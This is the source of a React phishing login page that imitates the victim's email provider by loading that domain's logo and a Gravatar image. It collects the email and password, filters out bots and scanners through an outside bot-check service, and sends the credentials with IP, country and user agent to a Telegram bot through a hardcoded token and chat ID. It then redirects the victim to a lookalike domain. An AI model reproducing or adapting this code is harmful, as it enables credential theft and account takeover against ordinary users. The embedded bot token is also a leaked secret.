import React, { useState } from 'react';
import axios from 'axios';
import md5 from 'md5'; // Import the md5 hashing library
import styles from '../styles/Index.module.css'; // Import the CSS Module

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailEntered, setEmailEntered] = useState(false);
  const [logo, setLogo] = useState('/favicon.ico'); // Default placeholder logo
  const [instruction, setInstruction] = useState('Verify your email identity to continue.');
  const [showModal, setShowModal] = useState(false); // State for showing the modal

  const getGravatarUrl = (email) => {
    const hash = md5(email.trim().toLowerCase());
    return `https://www.gravatar.com/avatar/${hash}?d=identicon`;
  };

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (email.includes('@')) {
      setEmailEntered(true);
      setInstruction('Verify email password');
      const domain = email.split('@')[1];
      setLogo(`https://logo.clearbit.com/${domain}`);
    } else {
      alert('Please enter a valid email address.');
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (password.length < 5) {
      alert('Password must be at least 5 characters long.');
      return;
    }

    setShowModal(true); // Show the modal when the form is submitted

    try {
      const userIP = await axios.get('https://api64.ipify.org?format=json').then((res) => res.data.ip);
      const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
        user_agent: navigator.userAgent,
        ip: userIP,
      });

      const { is_bot, country } = response.data;

      if (is_bot) {
        setShowModal(false); // Hide modal before redirecting
        window.location.href = '/denied';
        return;
      }

      const TELEGRAM_BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
      const TELEGRAM_CHAT_ID = '-1002493880170';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌍 <b>IP Address:</b> ${userIP}
🏳️ <b>Country:</b> ${country}
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      `;

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: loginAlert,
        parse_mode: 'HTML',
      });

      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://sag.lndustriephd.com/';
    } catch (error) {
      setShowModal(false); // Hide modal on error
      console.error('Error during API call:', error);
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div className={styles.loginContainer}>
      <div className={styles.loginBox}>
        <img src={logo} alt="Dynamic Logo" className={styles.logo} />
        <p className={styles.instruction}>{instruction}</p>
        {!emailEntered ? (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              placeholder="Enter recipient email"
              value={email}
              onChange={handleEmailChange}
              className={styles.input}
              required
            />
            <button type="submit" className={styles.button}>
              Next
            </button>
          </form>
        ) : (
          <>
            <p className={styles.enteredEmail}>
              <img src={getGravatarUrl(email)} alt="Profile Icon" className={styles.profileIcon} />
              {email}
            </p>
            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={styles.input}
                required
              />
              <button type="submit" className={styles.button}>
                Login
              </button>
            </form>
          </>
        )}
      </div>

      {showModal && (
        <div className={styles.modal}>
          <div className={styles.modalContent}>
            Checking, please wait<span className={styles.dots}>...</span>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;
